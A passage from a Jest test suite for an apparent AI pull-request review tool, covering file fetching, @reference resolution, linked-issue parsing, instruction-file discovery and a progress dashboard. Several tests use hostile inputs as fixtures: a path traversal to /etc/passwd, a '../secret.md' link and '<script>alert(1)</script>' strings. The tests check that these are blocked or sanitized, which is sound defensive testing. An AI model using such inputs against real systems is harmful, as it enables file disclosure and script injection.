    // Budget of 100 bytes: the large file (80) fits, small file (30) would exceed 110 > 100
    const result = await fetchFileContents(octokit, 'owner', 'repo', 'abc123', ['large.ts', 'small.ts'], 50000, 100);
    expect(result.size).toBe(1);
    expect(result.has('large.ts')).toBe(true);
  });

  it('skips binary files containing null bytes', async () => {
    const octokit = mockOctokit({
      'image.png': { content: 'header\0binary', size: 13 },
    });

    const result = await fetchFileContents(octokit, 'owner', 'repo', 'abc123', ['image.png']);
    expect(result.size).toBe(0);
  });

  it('returns empty map for empty file list', async () => {
    const octokit = mockOctokit({});
    const result = await fetchFileContents(octokit, 'owner', 'repo', 'abc123', []);
    expect(result.size).toBe(0);
  });
});

describe('resolveReferences', () => {
  function mockFiles(files: Record<string, string>) {
    return {
      read: jest.fn(async (path: string) => files[path] ?? null),
      list: jest.fn(async () => Object.keys(files)),
    };
  }

  it('resolves a single @rules/ reference', async () => {
    const files = mockFiles({
      '.claude/rules/commit-format.md': '## Commit Format\n\nKeep messages short.',
    });
    const content = 'Instructions:\n\n@rules/commit-format.md\n\nEnd.';
    const result = await resolveReferences(files, content, '.claude');

    expect(result).toContain('## Commit Format');
    expect(result).toContain('Keep messages short.');
    expect(result).not.toContain('@rules/commit-format.md');
    expect(result).toContain('End.');
  });

  it('resolves multiple references', async () => {
    const files = mockFiles({
      '.claude/rules/a.md': 'Content A',
      '.claude/rules/b.md': 'Content B',
    });
    const content = '@rules/a.md\n@rules/b.md';
    const result = await resolveReferences(files, content, '.claude');

    expect(result).toContain('Content A');
    expect(result).toContain('Content B');
    expect(result).not.toContain('@rules/a.md');
    expect(result).not.toContain('@rules/b.md');
  });

  it('leaves reference as-is with comment when file is missing', async () => {
    const files = mockFiles({});
    const content = 'Before\n@rules/missing.md\nAfter';
    const result = await resolveReferences(files, content, '.claude');

    expect(result).toContain('@rules/missing.md');
    expect(result).toContain('<!-- Could not resolve reference: rules/missing.md -->');
    expect(result).toContain('Before');
    expect(result).toContain('After');
  });

  it('respects max depth to prevent infinite recursion', async () => {
    const files = mockFiles({
      '.claude/rules/loop.md': '@rules/loop.md',
    });
    const content = '@rules/loop.md';
    const result = await resolveReferences(files, content, '.claude');

    // At depth 0: resolves @rules/loop.md -> "@rules/loop.md" (the file content)
    // At depth 1: resolves that -> "@rules/loop.md" again
    // At depth 2: resolves that -> "@rules/loop.md" again
    // At depth 3: returns as-is (max depth reached)
    expect(result).toContain('@rules/loop.md');
  });

  it('skips path traversal attempts', async () => {
    const files = mockFiles({});
    const content = 'Before\n@../../etc/passwd.md\nAfter';
    const result = await resolveReferences(files, content, '.claude');

    // The traversal reference should remain untouched (not fetched, no error comment)
    expect(result).toBe(content);
    expect(files.read).not.toHaveBeenCalled();
  });

  it('returns content unchanged when there are no references', async () => {
    const files = mockFiles({});
    const content = '## Instructions\n\nJust regular markdown content.';
    const result = await resolveReferences(files, content, '.claude');

    expect(result).toBe(content);
  });
});

describe('fetchLinkedIssues', () => {
  const mockGet = jest.fn();
  const octokit = {
    rest: {
      issues: { get: mockGet },
    },
  } as unknown as Parameters<typeof fetchLinkedIssues>[0];

  beforeEach(() => {
    mockGet.mockReset();
  });

  it('parses "Closes #42" from PR body', async () => {
    mockGet.mockResolvedValue({ data: { number: 42, title: 'Fix bug', body: 'Some description' } });

    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Closes #42');
    expect(result).toHaveLength(1);
    expect(result[0]).toEqual({ number: 42, title: 'Fix bug', body: 'Some description' });
    expect(mockGet).toHaveBeenCalledWith({ owner: 'owner', repo: 'repo', issue_number: 42 });
  });

  it('parses "fixes #10" case-insensitively', async () => {
    mockGet.mockResolvedValue({ data: { number: 10, title: 'Issue 10', body: 'Body' } });

    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', 'fixes #10');
    expect(result).toHaveLength(1);
    expect(result[0].number).toBe(10);
  });

  it('parses "Part of #5"', async () => {
    mockGet.mockResolvedValue({ data: { number: 5, title: 'Epic', body: 'Epic body' } });

    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Part of #5');
    expect(result).toHaveLength(1);
    expect(result[0].number).toBe(5);
  });

  it('parses "Resolves #7"', async () => {
    mockGet.mockResolvedValue({ data: { number: 7, title: 'Issue 7', body: 'Body' } });

    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Resolves #7');
    expect(result).toHaveLength(1);
    expect(result[0].number).toBe(7);
  });

  it('handles multiple references', async () => {
    mockGet.mockImplementation(({ issue_number }: { issue_number: number }) =>
      Promise.resolve({ data: { number: issue_number, title: `Issue ${issue_number}`, body: `Body ${issue_number}` } }),
    );

    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Closes #1, fixes #2, resolves #3');
    expect(result).toHaveLength(3);
    expect(result.map(r => r.number)).toEqual([1, 2, 3]);
  });

  it('deduplicates same issue referenced twice', async () => {
    mockGet.mockResolvedValue({ data: { number: 42, title: 'Bug', body: 'Body' } });

    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Closes #42 and also fixes #42');
    expect(result).toHaveLength(1);
    expect(mockGet).toHaveBeenCalledTimes(1);
  });

  it('returns empty array when no references found', async () => {
    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Just a regular PR body');
    expect(result).toEqual([]);
    expect(mockGet).not.toHaveBeenCalled();
  });

  it('returns empty array for empty body', async () => {
    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', '');
    expect(result).toEqual([]);
  });

  it('truncates long issue bodies to 2000 chars', async () => {
    const longBody = 'x'.repeat(3000);
    mockGet.mockResolvedValue({ data: { number: 1, title: 'Issue', body: longBody } });

    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Closes #1');
    expect(result[0].body.length).toBeLessThan(longBody.length);
    expect(result[0].body).toContain('... (truncated)');
  });

  it('skips issues that fail to fetch', async () => {
    mockGet.mockImplementation(({ issue_number }: { issue_number: number }) => {
      if (issue_number === 1) return Promise.resolve({ data: { number: 1, title: 'Good', body: 'Body' } });
      return Promise.reject(new Error('Not found'));
    });

    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Closes #1, closes #999');
    expect(result).toHaveLength(1);
    expect(result[0].number).toBe(1);
  });

  it('caps linked issues at 5', async () => {
    mockGet.mockImplementation(({ issue_number }: { issue_number: number }) =>
      Promise.resolve({ data: { number: issue_number, title: `Issue ${issue_number}`, body: `Body` } }),
    );

    const body = Array.from({ length: 8 }, (_, i) => `closes #${i + 1}`).join(' ');
    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', body);
    expect(result).toHaveLength(5);
    expect(mockGet).toHaveBeenCalledTimes(5);
  });

  it('returns consistent results on repeated calls (no stateful regex)', async () => {
    mockGet.mockResolvedValue({ data: { number: 42, title: 'Bug', body: 'Body' } });

    const first = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Closes #42');
    const second = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Closes #42');
    expect(first).toHaveLength(1);
    expect(second).toHaveLength(1);
  });

  it('sanitizes issue title and body', async () => {
    mockGet.mockResolvedValue({
      data: { number: 1, title: 'Bug <!-- hidden -->', body: 'See <script>alert(1)</script> here' },
    });

    const result = await fetchLinkedIssues(octokit, 'owner', 'repo', 'Closes #1');
    expect(result[0].title).not.toContain('<!--');
    expect(result[0].body).not.toContain('<script>');
  });
});

describe('fetchRepoContext instruction files', () => {
  function mockOctokit(
    treeEntries: Array<{ path: string; type: string }>,
    fileContents: Record<string, string>,
  ) {
    return {
      rest: {
        git: {
          getTree: jest.fn(async () => ({
            data: { tree: treeEntries },
          })),
        },
        repos: {
          get: jest.fn().mockRejectedValue(new Error('Not found')),
          getContent: jest.fn(async ({ path }: { path: string }) => {
            const content = fileContents[path];
            if (content === undefined) throw Object.assign(new Error(`Not found: ${path}`), { status: 404 });
            if (content === 'FAIL') throw Object.assign(new Error('Server error'), { status: 500 });
            return {
              data: {
                content: Buffer.from(content).toString('base64'),
                encoding: 'base64',
              },
            };
          }),
        },
      },
    } as unknown as Parameters<typeof fetchRepoContext>[0];
  }

  const baseTree = [
    { path: 'CLAUDE.md', type: 'blob' },
    { path: '.claude/CLAUDE.md', type: 'blob' },
    { path: 'src/CLAUDE.md', type: 'blob' },
    { path: 'src/auth/CLAUDE.md', type: 'blob' },
    { path: 'lib/CLAUDE.md', type: 'blob' },
  ];

  it('finds CLAUDE.md in subdirectories for changed files', async () => {
    const octokit = mockOctokit(baseTree, {
      'src/CLAUDE.md': 'Source rules',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['src/index.ts']);
    expect(result).toContain('## src/CLAUDE.md');
    expect(result).toContain('Source rules');
  });

  it('walks up directory tree to find nearest CLAUDE.md', async () => {
    const octokit = mockOctokit(baseTree, {
      'src/auth/CLAUDE.md': 'Auth rules',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['src/auth/handlers.ts']);
    expect(result).toContain('## src/auth/CLAUDE.md');
    expect(result).toContain('Auth rules');
  });

  it('deduplicates when two changed files share the same nearest CLAUDE.md', async () => {
    const octokit = mockOctokit(baseTree, {
      'src/CLAUDE.md': 'Source rules',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', [
      'src/foo.ts',
      'src/bar.ts',
    ]);
    const matches = result.match(/## src\/CLAUDE\.md/g);
    expect(matches).toHaveLength(1);
  });

  it('lists .claude/CLAUDE.md once when a file under .claude changes', async () => {
    const octokit = mockOctokit(baseTree, { '.claude/CLAUDE.md': 'Claude dir rules' });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['.claude/settings.json']);
    expect(result).toBe('## .claude/CLAUDE.md\n\nClaude dir rules');
  });

  it('returns empty string when no subdirectory CLAUDE.md files exist', async () => {
    const octokit = mockOctokit(
      [{ path: 'CLAUDE.md', type: 'blob' }],
      {},
    );

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['src/index.ts']);
    expect(result).toBe('');
  });

  it('returns empty string for empty changedPaths', async () => {
    const octokit = mockOctokit(baseTree, {});

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', []);
    expect(result).toBe('');
  });

  it('fetches multiple CLAUDE.md files for changes in different directories', async () => {
    const octokit = mockOctokit(baseTree, {
      'src/CLAUDE.md': 'Source rules',
      'lib/CLAUDE.md': 'Lib rules',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', [
      'src/index.ts',
      'lib/utils.ts',
    ]);
    expect(result).toContain('## src/CLAUDE.md');
    expect(result).toContain('Source rules');
    expect(result).toContain('## lib/CLAUDE.md');
    expect(result).toContain('Lib rules');
  });

  it('resolves @references in subdirectory CLAUDE.md files', async () => {
    const octokit = mockOctokit(baseTree, {
      'src/CLAUDE.md': '@rules/style.md',
      'src/rules/style.md': 'Style guidelines',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['src/index.ts']);
    expect(result).toContain('Style guidelines');
  });

  it('skips CLAUDE.md files that fail to fetch, warning on errors other than not found', async () => {
    const warningSpy = jest.spyOn(core, 'warning').mockImplementation(() => {});
    const octokit = mockOctokit([...baseTree, { path: 'test/CLAUDE.md', type: 'blob' }], {
      'src/CLAUDE.md': 'Source rules',
      'test/CLAUDE.md': 'FAIL',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', [
      'src/index.ts',
      'lib/utils.ts',
      'test/a.test.ts',
    ]);
    expect(result).toBe('## src/CLAUDE.md\n\nSource rules');
    expect(warningSpy.mock.calls.map(([message]) => message)).toEqual([expect.stringContaining('test/CLAUDE.md')]);
    warningSpy.mockRestore();
  });

  it('ignores root-level changed files with no subdirectory CLAUDE.md', async () => {
    const octokit = mockOctokit(baseTree, {});

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['package.json']);
    expect(result).toBe('');
  });
  const agentsTree = [...baseTree, { path: 'AGENTS.md', type: 'blob' }, { path: 'src/AGENTS.md', type: 'blob' }];

  it('reads the nearest AGENTS.md above a changed file, and none for files outside it', async () => {
    const octokit = mockOctokit([...agentsTree, { path: 'src/auth/AGENTS.md', type: 'blob' }], {
      'src/AGENTS.md': 'Source agent rules',
      'src/auth/AGENTS.md': 'Auth agent rules',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['src/auth/login.ts']);
    expect(result).toBe('## src/auth/AGENTS.md\n\nAuth agent rules');
    expect(await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['lib/utils.ts'])).toEqual({ text: '', files: [] });
  });

  it('reads the nearest CLAUDE.md and AGENTS.md separately', async () => {
    const octokit = mockOctokit(agentsTree, {
      'src/auth/CLAUDE.md': 'Auth claude rules',
      'src/AGENTS.md': 'Source agent rules',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['src/auth/login.ts']);
    expect(result).toContain('## src/auth/CLAUDE.md');
    expect(result).toContain('## src/AGENTS.md');
  });

  it('includes a CLAUDE.md that only imports @AGENTS.md and the AGENTS.md once', async () => {
    const octokit = mockOctokit(agentsTree, {
      'CLAUDE.md': '@AGENTS.md\n',
      'AGENTS.md': 'Root agent rules\n',
      'src/CLAUDE.md': '@AGENTS.md\n',
      'src/AGENTS.md': 'Source agent rules\n',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['src/index.ts']);
    expect(result.match(/Root agent rules/g)).toHaveLength(1);
    expect(result.match(/Source agent rules/g)).toHaveLength(1);
    expect(result).not.toContain('## CLAUDE.md');
    expect(result).not.toContain('## src/CLAUDE.md');
  });

  it('reads the root CONTRIBUTING.md, then the .md files the instruction files link to, breadth first', async () => {
    const octokit = mockOctokit(agentsTree, {
      'src/AGENTS.md': 'Source rules, see [notes](notes.md).',
      'AGENTS.md': 'Root rules: [style](docs/style.md#naming), [site](https://example.com/a.md), [up](../secret.md), [abs](/docs/abs.md) and [self](AGENTS.md).',
      'CLAUDE.md': '@AGENTS.md\n',
      'CONTRIBUTING.md': 'Contributing: see [AGENTS.md](AGENTS.md) and [conventions](./docs/conventions.md "Conventions").',
      'src/notes.md': 'Source notes',
      'docs/style.md': 'Style, see [deeper](deeper.md).',
      'docs/abs.md': 'Absolute link',
      'docs/conventions.md': 'Coding conventions',
      'docs/deeper.md': 'Deeper, see [deepest](deepest.md).',
      'docs/deepest.md': 'Deepest, see [too deep](too-deep.md).',
      'docs/too-deep.md': 'Never read',
    });

    const { text: result, files } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['src/index.ts']);
    expect(result.match(/^## .+$/gm)).toEqual([
      '## src/AGENTS.md', '## AGENTS.md', '## CONTRIBUTING.md',
      '## src/notes.md', '## docs/style.md', '## docs/abs.md', '## docs/conventions.md', '## docs/deeper.md', '## docs/deepest.md',
    ]);
    // Each printed file is also returned on its own, with its text.
    expect(files.map(f => f.path)).toEqual(result.match(/^## .+$/gm)!.map(heading => heading.slice(3)));
    expect(files.filter(f => ['src/AGENTS.md', 'docs/style.md'].includes(f.path)).map(f => f.text)).toEqual(['Source rules, see [notes](notes.md).', 'Style, see [deeper](deeper.md).']);
    const read = (octokit.rest.repos.getContent as unknown as jest.Mock).mock.calls.map(([{ path }]) => path);
    expect(read).not.toEqual(expect.arrayContaining(['docs/too-deep.md']));
    expect(read.filter((path: string) => path.includes('secret') || path.includes('example.com'))).toEqual([]);
  });

  it('includes files with identical content once', async () => {
    const octokit = mockOctokit(agentsTree, {
      'CLAUDE.md': 'Shared rules',
      'AGENTS.md': 'Shared rules\n',
      'src/AGENTS.md': 'Shared rules',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['src/index.ts']);
    expect(result).toBe('## src/AGENTS.md\n\nShared rules');
  });

  it('lists the nearest files first, cuts the file that crosses the size cap and leaves out farther ones', async () => {
    const big = (label: string, size = 12_000) => `${label} ${'x'.repeat(size)}`;
    const octokit = mockOctokit(agentsTree, {
      'src/auth/CLAUDE.md': big('auth'),
      'src/AGENTS.md': big('src'),
      'AGENTS.md': big('root agents'),
      'CLAUDE.md': 'root claude',
    });

    const { text: result } = await fetchRepoContext(octokit, 'owner', 'repo', 'abc123', ['src/auth/login.ts']);
    expect(result.match(/^## .+$/gm)).toEqual(['## src/auth/CLAUDE.md', '## src/AGENTS.md', '## AGENTS.md']);
    expect(result).not.toContain(big('root agents'));
    expect(result).not.toContain('root claude');

    const warningSpy = jest.spyOn(core, 'warning').mockImplementation(() => {});
    const oversized = mockOctokit(agentsTree, { 'src/AGENTS.md': big('src', 40_000) });
    const { text: cut, files: cutFiles, cut: cutPath } = await fetchRepoContext(oversized, 'owner', 'repo', 'abc123', ['src/index.ts']);
    expect(cut.startsWith('## src/AGENTS.md\n\nsrc x')).toBe(true);
    expect(cut.length).toBeLessThanOrEqual(30_003);
    // The cut file is listed with the text that was printed, and named as the one that was cut.
    expect(cutFiles).toEqual([{ path: 'src/AGENTS.md', text: cut.slice('## src/AGENTS.md\n\n'.length) }]);
    expect(cutPath).toBe('src/AGENTS.md');
    expect(warningSpy).toHaveBeenCalledWith(expect.stringContaining('cut src/AGENTS.md and skipped any farther files'));
    warningSpy.mockRestore();
  });
});

describe('buildDashboard', () => {

  it('renders the started phase with running review and pending judge', () => {
    const data: DashboardData = { phase: 'started', lineCount: 150, agentCount: 5 };
    const md = buildDashboard(data);
    expect(md).toContain('**Review in progress**');
    expect(md).toContain('**Planner**');
    expect(md).toContain(`${INDENT}150 lines · 5 agents`);
    expect(md).toContain('**Review**');
    expect(md).toContain(`${INDENT}reviewing with 5 agents...`);
    expect(md).toContain('**Judge**');
    expect(md).toContain(`${INDENT}pending`);
  });

  it('renders the planning phase with analyzing planner and pending review/judge', () => {
    const data: DashboardData = { phase: 'planning', lineCount: 83, agentCount: 0 };
    const md = buildDashboard(data);
    expect(md).toContain('**Review in progress**');
    expect(md).toContain('**Planner**');
    expect(md).toContain(`${INDENT}analyzing...`);
    expect(md).toContain('**Review**');
    expect(md).toContain('**Judge**');
    expect(md).toContain(`${INDENT}pending`);
    expect(md).not.toContain('\uD83D\uDD0D');
  });

  it('separates stages with blank lines', () => {
    const data: DashboardData = { phase: 'planning', lineCount: 83, agentCount: 0 };
    const md = buildDashboard(data);
    const parts = md.split('\n\n');
    expect(parts.length).toBeGreaterThanOrEqual(4);
    expect(parts.some(p => p.includes('**Planner**'))).toBe(true);
    expect(parts.some(p => p.includes('**Review**'))).toBe(true);
    expect(parts.some(p => p.includes('**Judge**'))).toBe(true);
  });

  it('renders per-agent progress when agentProgress is provided', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 150, agentCount: 5,
      agentProgress: [
        { name: 'Security & Safety', status: 'done', findingCount: 2, durationMs: 4000 },
        { name: 'Architecture & Design', status: 'done', findingCount: 0, durationMs: 3200 },
        { name: 'Correctness & Logic', status: 'reviewing' },
        { name: 'Testing & Coverage', status: 'pending' },
        { name: 'Performance & Efficiency', status: 'pending' },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Review in progress**');
    expect(md).toContain('**Review:** 2/5 agents complete');
    expect(md).toContain(`${INDENT}✅ Security & Safety: 2 findings (4s)`);
    expect(md).toContain(`${INDENT}✅ Architecture & Design: 0 findings (3s)`);
    expect(md).toContain(`${INDENT}⏳ Correctness & Logic`);
    expect(md).toContain(`${INDENT}○ Testing & Coverage`);
    expect(md).toContain(`${INDENT}○ Performance & Efficiency`);
    expect(md).toContain('**Judge**');
    expect(md).not.toContain('\uD83D\uDD0D');
    expect(md).not.toMatch(DASH_SEPARATOR_RE);
    expect(md.replace(/^(?:&nbsp;)*(?:\u2705|\u{1F534}|\u26A0\uFE0F|\u23F3) /gmu, '')).not.toMatch(EMOJI_RE);
  });

  it('renders failed agent status in agent progress', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 100, agentCount: 3,
      agentProgress: [
        { name: 'Security & Safety', status: 'failed', durationMs: 1500 },
        { name: 'Correctness & Logic', status: 'done', findingCount: 1, durationMs: 2000 },
        { name: 'Architecture & Design', status: 'reviewing' },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain(`${INDENT}🔴 Security & Safety: failed (2s)`);
    expect(md).toContain(`${INDENT}✅ Correctness & Logic: 1 finding (2s)`);
  });

  it('renders the reviewed phase with finding count and running judge', () => {
    const data: DashboardData = { phase: 'reviewed', lineCount: 300, agentCount: 3, rawFindingCount: 12 };
    const md = buildDashboard(data);
    expect(md).toContain('**Review in progress**');
    expect(md).toContain('**Review:** 12 findings');
    expect(md).toContain('**Judge**');
    expect(md).toContain(`${INDENT}evaluating 12 findings...`);
  });

  it('renders judgeInputCount separately from rawFindingCount in reviewed phase', () => {
    const data: DashboardData = { phase: 'reviewed', lineCount: 300, agentCount: 3, rawFindingCount: 12, judgeInputCount: 10 };
    const md = buildDashboard(data);
    expect(md).toContain('**Review:** 12 findings');
    expect(md).toContain(`${INDENT}evaluating 10 findings...`);
    expect(buildDashboard({ ...data, rawFindingCount: 1, judgeInputCount: 0, staticDedupCount: 1, llmDedupCount: 0 }))
      .toContain(`${INDENT}evaluating 0 findings (1 dropped as a repeat of an earlier resolved finding)...`);
    expect(buildDashboard({ ...data, staticDedupCount: 1, llmDedupCount: 1 }))
      .toContain(`${INDENT}evaluating 10 findings (2 dropped as repeats of earlier resolved findings)...`);
  });

  it('renders per-agent detail in the reviewed phase when agentProgress is provided', () => {
    const data: DashboardData = {
      phase: 'reviewed', lineCount: 300, agentCount: 3, rawFindingCount: 7,
      agentProgress: [
        { name: 'Security & Safety', status: 'done', findingCount: 3, durationMs: 4000 },
        { name: 'Correctness & Logic', status: 'done', findingCount: 4, durationMs: 2500 },
        { name: 'Architecture & Design', status: 'done', findingCount: 0, durationMs: 3100 },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Review in progress**');
    expect(md).toContain('**Review:** 7 findings');
    expect(md).toContain(`${INDENT}✅ Security & Safety: 3 findings (4s)`);
    expect(md).toContain(`${INDENT}✅ Correctness & Logic: 4 findings (3s)`);
    expect(md).toContain(`${INDENT}✅ Architecture & Design: 0 findings (3s)`);
    expect(md).toContain(`${INDENT}evaluating 7 findings...`);
  });

  it('renders the complete phase with kept/dropped counts', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 500, agentCount: 7,
      rawFindingCount: 20, keptCount: 8, droppedCount: 12,
    };
    const md = buildDashboard(data);
    expect(md).not.toContain('**Review in progress**');
    expect(md).toContain('**Review:** 20 findings');
    expect(md).toContain('**Judge:** 8 kept · 12 dropped');
    expect(md).not.toContain('before the judge');
    expect(buildDashboard({ ...data, rawFindingCount: 1, keptCount: 0, droppedCount: 0, suppressionCount: 0, llmDedupCount: 1 }))
      .toContain(`**Judge:** 0 kept · 0 dropped\n${INDENT}before the judge: 1 dropped as a repeat of an earlier resolved finding`);
  });

  it('renders per-agent detail and the review class and group in the complete phase', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 500, agentCount: 2,
      rawFindingCount: 3, keptCount: 2, droppedCount: 1,
      routing: { class: 'security', group: 'pair' },
      agentProgress: [
        { name: 'Claude Sonnet 5.5 · high', status: 'done', findingCount: 2, durationMs: 38000 },
        { name: 'Claude Opus 5.5 · high', status: 'done', findingCount: 1, durationMs: 41000 },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain([
      '**Review (security · pair):** 3 findings',
      `${INDENT}✅ Claude Sonnet 5.5 · high: 2 findings (38s)`,
      `${INDENT}✅ Claude Opus 5.5 · high: 1 finding (41s)`,
    ].join('\n'));
    expect(md).toContain('**Judge:** 2 kept · 1 dropped');
    expect(buildDashboard({ ...data, routing: { group: 'pair' } })).toContain('**Review (pair):** 3 findings');
    expect(buildDashboard({ ...data, phase: 'started', agentProgress: [{ name: 'Quick check · Claude Haiku 5.5', status: 'reviewing' }], routing: { class: 'docs', group: 'trivial' } }))
      .toContain(`**Review (docs · trivial):** 0/1 agents complete\n${INDENT}⏳ Quick check · Claude Haiku 5.5`);
  });

  it('renders failed agent in the complete phase', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 200, agentCount: 2,
      rawFindingCount: 3, keptCount: 2, droppedCount: 1,
      agentProgress: [
        { name: 'Security & Safety', status: 'done', findingCount: 3, durationMs: 2000 },
        { name: 'Architecture & Design', status: 'failed', durationMs: 500 },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain(`${INDENT}✅ Security & Safety: 3 findings (2s)`);
    expect(md).toContain(`${INDENT}🔴 Architecture & Design: failed (500ms)`);
    expect(md).toContain('**Judge:** 2 kept · 1 dropped');
  });

  it('formats sub-second durations in milliseconds', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 100, agentCount: 1,
      agentProgress: [
        { name: 'Security & Safety', status: 'done', findingCount: 1, durationMs: 750 },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain('750ms');
  });

  it('defaults rawFindingCount to 0 when not provided in reviewed phase', () => {
    const data: DashboardData = { phase: 'reviewed', lineCount: 100, agentCount: 3 };
    const md = buildDashboard(data);
    expect(md).toContain('0 findings');
  });

  it('uses bold stage headers instead of status icons', () => {
    const data: DashboardData = { phase: 'started', lineCount: 50, agentCount: 2 };
    const md = buildDashboard(data);
    expect(md).not.toContain('| |');
    expect(md).not.toContain('|---|');
    expect(md).toContain('**Planner**');
    expect(md).toContain('**Review**');
    expect(md).toContain('**Judge**');
  });

  it('renders plannerInfo with structured details', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 200, agentCount: 5,
      plannerInfo: { agentCount: 5, judgeEffort: 'high', prType: 'feat' },
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Planner**');
    expect(md).toContain(`${INDENT}feat · 200 lines · 5 agents`);
    expect(md).toContain(`${INDENT}judge effort: high`);
  });

  it('renders the resolved roster size on the Planner line, not the planner-requested teamSize', () => {
    // The dashboard must show the actual resolved roster count, not the planner-requested
    // teamSize, which can diverge when prior-round pinning grows the roster.
    const data: DashboardData = {
      phase: 'started', lineCount: 120, agentCount: 5,
      plannerInfo: { agentCount: 5, judgeEffort: 'high', prType: 'fix' },
    };
    const md = buildDashboard(data);
    expect(md).toContain(`${INDENT}fix · 120 lines · 5 agents`);
    expect(md).not.toContain('3 agents');
  });

  it('omits the prType chip when the value is off-vocab and never leaks the raw value', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 100, agentCount: 3,
      plannerInfo: { agentCount: 3, judgeEffort: 'low', prType: '<script>alert(1)</script>' },
    };
    const md = buildDashboard(data);
    expect(md).toContain(`${INDENT}100 lines · 3 agents`);
    expect(md).not.toContain('unknown');
    expect(md).not.toContain('<script>');
  });

  it('omits the prType chip when the value is the `unknown` sentinel', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 100, agentCount: 3,
      plannerInfo: { agentCount: 3, judgeEffort: 'low', prType: 'unknown' },
    };
    const md = buildDashboard(data);
    expect(md).toContain(`${INDENT}100 lines · 3 agents`);
    expect(md).not.toContain('unknown ·');
    expect(md).not.toContain('· unknown');
  });

  it.each(['build', 'chore', 'ci', 'docs', 'feat', 'fix', 'perf', 'refactor', 'revert', 'style', 'test'])(
    'renders the prType chip for canonical type `%s`',
    prType => {
      const data: DashboardData = {
        phase: 'started', lineCount: 50, agentCount: 2,
        plannerInfo: { agentCount: 2, judgeEffort: 'low', prType },
      };
      const md = buildDashboard(data);
      expect(md).toContain(`${INDENT}${prType} · 50 lines · 2 agents`);
    },
  );

  it('renders severity breakdown in judge section when provided', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 400, agentCount: 5,
      rawFindingCount: 8, keptCount: 2, droppedCount: 6,
      keptSeverities: { blocker: 1, note: 1 },
      droppedSeverities: { note: 5, ignore: 1 },
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Judge:** 2 kept · 6 dropped');
    expect(md).toContain(`${INDENT}kept: 1 blocker · 1 note`);
    expect(md).toContain(`${INDENT}dropped: 5 note · 1 ignore`);
  });

  it('renders warning in severity breakdown when warning count is non-zero', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 200, agentCount: 3,
      rawFindingCount: 5, keptCount: 3, droppedCount: 2,
      keptSeverities: { blocker: 1, warning: 2 },
      droppedSeverities: { warning: 1, note: 1 },
    };
    const md = buildDashboard(data);
    expect(md).toContain(`${INDENT}kept: 1 blocker · 2 warning`);
    expect(md).toContain(`${INDENT}dropped: 1 warning · 1 note`);
  });

  it('renders plannerInfo in complete phase', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 400, agentCount: 5,
      keptCount: 3, droppedCount: 5, rawFindingCount: 8,
      plannerInfo: { agentCount: 5, judgeEffort: 'high', prType: 'fix' },
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Planner**');
    expect(md).toContain(`${INDENT}fix · 400 lines · 5 agents`);
    expect(md).toContain(`${INDENT}judge effort: high`);
  });

  it('sanitizes unknown effort values in plannerInfo', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 100, agentCount: 3,
      plannerInfo: { agentCount: 3, judgeEffort: 'injected' as unknown as 'low', prType: 'feat' },
    };
    const md = buildDashboard(data);
    expect(md).toContain('judge effort: unknown');
    expect(md).not.toContain('injected');
  });

  it('omits severity breakdown lines when severities are not provided', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 400, agentCount: 5,
      rawFindingCount: 8, keptCount: 2, droppedCount: 6,
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Judge:** 2 kept · 6 dropped');
    expect(md).not.toContain(`${INDENT}kept:`);
    expect(md).not.toContain(`${INDENT}dropped:`);
  });

  it('renders the memory and test-nit suppression counts in judge section when provided', () => {
